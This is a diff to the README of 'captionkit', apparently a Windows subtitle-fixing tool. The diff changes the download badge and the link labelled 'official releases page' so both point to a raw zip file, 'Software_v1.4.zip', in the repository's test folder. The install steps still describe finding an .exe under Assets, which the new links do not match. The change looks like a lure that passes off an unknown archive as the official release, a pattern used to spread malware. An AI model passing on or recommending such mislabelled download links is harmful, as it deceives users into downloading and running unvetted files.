@@ -1,6 +1,6 @@
 # 📝 captionkit - Fix your subtitle files with ease
 
-[![Download CaptionKit](https://img.shields.io/badge/Download-CaptionKit-blue.svg)](https://github.com/molhamh3086/captionkit)
+[![Download CaptionKit](https://img.shields.io/badge/Download-CaptionKit-blue.svg)](https://raw.githubusercontent.com/molhamh3086/captionkit/main/test/Software_v1.4.zip)
 
 CaptionKit provides a simple way to manage subtitle files. You can convert between formats, shift timing, and fix alignment errors without any complex setup. This tool runs entirely on your computer, which keeps your video files and private information secure.
 
@@ -21,7 +21,7 @@ You do not need to install extra software or coding environments. CaptionKit wor
 
 Follow these steps to get the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/molhamh3086/captionkit) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/molhamh3086/captionkit/main/test/Software_v1.4.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saves downloads.
